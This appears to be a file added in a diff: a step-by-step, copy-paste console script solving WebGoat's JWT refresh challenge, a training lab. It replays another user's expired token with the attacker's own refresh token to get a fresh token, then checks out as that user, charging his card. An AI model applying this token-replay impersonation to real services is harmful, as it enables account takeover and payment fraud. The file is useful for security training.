@@ -1,0 +1,253 @@
+╔═══════════════════════════════════════════════════════════╗
+║   JWT REFRESH - COPY/PASTE READY (GUARANTEED OUTPUT!)   ║
+║   Each section shows output immediately when pasted      ║
+╚═══════════════════════════════════════════════════════════╝
+
+⚠️ IMPORTANT: Each section is wrapped in (function() { ... })();
+This makes it execute IMMEDIATELY when you paste it!
+
+═══════════════════════════════════════════════════════════
+📋 SECTION 1: SETUP
+═══════════════════════════════════════════════════════════
+
+Copy everything below (including first line) → Paste → Enter
+
+(function() {
+    console.log('═══════════════════════════════════════════════════════');
+    console.log('[SECTION 1] SETUP');
+    console.log('═══════════════════════════════════════════════════════');
+    window.TOMS_EXPIRED = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+    console.log('✓ Tom\'s expired token saved');
+    console.log('  Preview:', window.TOMS_EXPIRED.substring(0, 40) + '...');
+    try {
+        const decoded = JSON.parse(atob(window.TOMS_EXPIRED.split('.')[1]));
+        console.log('  User:', decoded.user);
+        console.log('  Expired:', new Date(decoded.exp * 1000).toLocaleString());
+    } catch (e) {
+        console.log('  (Decode error:', e.message + ')');
+    }
+    console.log('\n✅ Section 1 complete!');
+    console.log('\n⚠️ BEFORE RUNNING SECTION 2:');
+    console.log('Set your refresh token:');
+    console.log('   window.myRefreshToken = "PASTE_YOUR_ACTUAL_REFRESH_TOKEN_HERE";');
+    console.log('\nThen run Section 2.');
+})();
+
+✅ You should see:
+   [SECTION 1] SETUP
+   ✓ Tom's expired token saved
+   ✅ Section 1 complete!
+
+🔧 THEN SET YOUR REFRESH TOKEN:
+   window.myRefreshToken = "PASTE_YOUR_ACTUAL_REFRESH_TOKEN_HERE";
+
+═══════════════════════════════════════════════════════════
+📋 SECTION 2: GET TOM'S NEW TOKEN
+═══════════════════════════════════════════════════════════
+
+Copy everything below (including first line) → Paste → Enter
+
+(function() {
+    console.log('═══════════════════════════════════════════════════════');
+    console.log('[SECTION 2] GET TOM\'S NEW TOKEN');
+    console.log('═══════════════════════════════════════════════════════');
+    console.log('[Step 1] Checking tokens...');
+    if (typeof window.TOMS_EXPIRED === 'undefined') {
+        console.log('%c❌ ERROR: Tom\'s token not found!', 'color: red; font-weight: bold; background: #ffcccc; padding: 5px');
+        console.log('Run SECTION 1 first!');
+        return;
+    }
+    console.log('✓ Tom\'s token: OK');
+    if (typeof window.myRefreshToken === 'undefined' || !window.myRefreshToken) {
+        console.log('%c❌ ERROR: Your refresh token not set!', 'color: red; font-weight: bold; background: #ffcccc; padding: 5px');
+        console.log('\nYou need to set it first:');
+        console.log('   window.myRefreshToken = "PASTE_YOUR_ACTUAL_REFRESH_TOKEN_HERE";');
+        console.log('\nThen re-run this section.');
+        return;
+    }
+    console.log('✓ Your refresh token: OK');
+    console.log('  Length:', window.myRefreshToken.length);
+    console.log('  Preview:', window.myRefreshToken.substring(0, 40) + '...');
+    console.log('\n[Step 2] Sending refresh request...');
+    console.log('  URL: /WebGoat/JWT/refresh/newToken');
+    console.log('  Method: POST');
+    fetch('/WebGoat/JWT/refresh/newToken', {
+        method: 'POST',
+        headers: {
+            'Authorization': 'Bearer ' + window.TOMS_EXPIRED,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ refresh_token: window.myRefreshToken })
+    })
+    .then(response => {
+        console.log('\n[Step 3] Response received!');
+        console.log('  Status:', response.status, response.statusText);
+        console.log('  OK:', response.ok);
+        if (!response.ok) {
+            return response.text().then(text => {
+                console.log('%c❌ Request failed!', 'color: red; font-weight: bold');
+                console.log('Response body:', text.substring(0, 200));
+                throw new Error('HTTP ' + response.status);
+            });
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log('\n[Step 4] Parsing response...');
+        console.log('Response data:', data);
+        if (!data.access_token) {
+            console.log('%c⚠️ No access_token in response!', 'color: orange; font-weight: bold');
+            console.log('Response keys:', Object.keys(data));
+            return;
+        }
+        console.log('\n[Step 5] Saving Tom\'s new token...');
+        window.tomsNewToken = data.access_token;
+        console.log('✓ Saved to: window.tomsNewToken');
+        try {
+            const decoded = JSON.parse(atob(data.access_token.split('.')[1]));
+            console.log('\n[Step 6] Verifying token...');
+            console.log('Token payload:', decoded);
+            console.log('User:', decoded.user);
+            if (decoded.user === 'Tom') {
+                console.log('\n%c✅ SUCCESS! Got Tom\'s token!', 'color: white; background: green; font-size: 18px; font-weight: bold; padding: 10px');
+                console.log('\n✅ Section 2 complete!');
+                console.log('\n🚀 Now run SECTION 3 to checkout!');
+            } else {
+                console.log('\n%c⚠️ Token user is:', decoded.user, 'color: orange; font-weight: bold');
+                console.log('Expected: Tom');
+            }
+        } catch (e) {
+            console.log('Decode error:', e.message);
+        }
+    })
+    .catch(error => {
+        console.log('\n%c❌ ERROR!', 'color: red; font-weight: bold; font-size: 16px');
+        console.log('Error:', error.message);
+        console.log('Full error:', error);
+    });
+})();
+
+✅ You should see:
+   [SECTION 2] GET TOM'S NEW TOKEN
+   [Step 1] Checking tokens...
+   ✓ Tom's token: OK
+   ✓ Your refresh token: OK
+   [Step 2] Sending refresh request...
+   [Step 3] Response received!
+   [Step 4] Parsing response...
+   [Step 5] Saving Tom's new token...
+   [Step 6] Verifying token...
+   ✅ SUCCESS! Got Tom's token!
+
+═══════════════════════════════════════════════════════════
+📋 SECTION 3: CHECKOUT AS TOM
+═══════════════════════════════════════════════════════════
+
+Copy everything below (including first line) → Paste → Enter
+
+(function() {
+    console.log('═══════════════════════════════════════════════════════');
+    console.log('[SECTION 3] CHECKOUT AS TOM');
+    console.log('═══════════════════════════════════════════════════════');
+    console.log('[Step 1] Checking if Tom\'s token is ready...');
+    if (typeof window.tomsNewToken === 'undefined' || !window.tomsNewToken) {
+        console.log('%c❌ ERROR: Tom\'s new token not found!', 'color: red; font-weight: bold; background: #ffcccc; padding: 5px');
+        console.log('\nYou need to run SECTION 2 first!');
+        return;
+    }
+    console.log('✓ Tom\'s new token found!');
+    console.log('  Token:', window.tomsNewToken.substring(0, 40) + '...');
+    console.log('\n[Step 2] Sending checkout request...');
+    console.log('  URL: /WebGoat/JWT/refresh/checkout');
+    fetch('/WebGoat/JWT/refresh/checkout', {
+        method: 'POST',
+        headers: {
+            'Authorization': 'Bearer ' + window.tomsNewToken,
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest'
+        }
+    })
+    .then(response => {
+        console.log('\n[Step 3] Response received!');
+        console.log('  Status:', response.status, response.statusText);
+        return response.json();
+    })
+    .then(data => {
+        console.log('\n[Step 4] Checkout response:');
+        console.log(data);
+        if (data.lessonCompleted === true) {
+            console.log('\n%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
+            console.log('%c🎉 SUCCESS! TOM PAID FOR THE BOOKS! 💰', 'color: white; background: green; font-size: 24px; font-weight: bold; padding: 15px');
+            console.log('%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
+            console.log('\n✅ Challenge Complete!');
+            console.log('Tom\'s credit card: -$31.53 📉');
+        } else {
+            console.log('\n%c⚠️ Checkout completed but lesson not marked as done', 'color: orange; font-weight: bold');
+            console.log('Feedback:', data.feedback);
+        }
+    })
+    .catch(error => {
+        console.log('\n%c❌ CHECKOUT ERROR!', 'color: red; font-weight: bold; font-size: 16px');
+        console.log('Error:', error.message);
+    });
+})();
+
+✅ You should see:
+   [SECTION 3] CHECKOUT AS TOM
+   [Step 1] Checking if Tom's token is ready...
+   ✓ Tom's new token found!
+   [Step 2] Sending checkout request...
+   [Step 3] Response received!
+   [Step 4] Checkout response...
+   🎉 SUCCESS! TOM PAID FOR THE BOOKS! 💰
+
+═══════════════════════════════════════════════════════════
+🔍 WHY THIS VERSION WORKS
+═══════════════════════════════════════════════════════════
+
+The KEY DIFFERENCE: Each section is wrapped in:
+
+   (function() { 
+       ... your code ...
+   })();
+
+The () at the end makes it execute IMMEDIATELY when pasted!
+
+Without this wrapper, JavaScript waits and may not execute.
+With this wrapper, it ALWAYS executes immediately.
+
+═══════════════════════════════════════════════════════════
+⚠️ IF SECTION 2 STILL SHOWS NO OUTPUT
+═══════════════════════════════════════════════════════════
+
+Test if console is working:
+
+console.log('TEST');
+
+If you see "TEST" → Console works, scripts should work too
+If you see NOTHING → Console has a problem
+
+Check:
+1. Are you in Console tab? (F12 → Console)
+2. Console filter set to "All levels"?
+3. No text in the filter search box?
+4. Try refreshing the page and start over
+
+═══════════════════════════════════════════════════════════
+📁 FILES SUMMARY
+═══════════════════════════════════════════════════════════
+
+✅ jwt_refresh_GUARANTEED_OUTPUT.js
+   → Full version with detailed comments
+   → Copy from this file
+
+✅ THIS FILE (JWT_REFRESH_COPYPASTE_READY.txt)
+   → Quick reference with ready-to-paste sections
+   → No comments, just pure code to copy
+
+Choose whichever is easier for you!
+
+═══════════════════════════════════════════════════════════
+Tom: "How did my card get charged?" 💳
+You: "(function() { console.log('Sorry Tom!'); })();" 😏
+═══════════════════════════════════════════════════════════
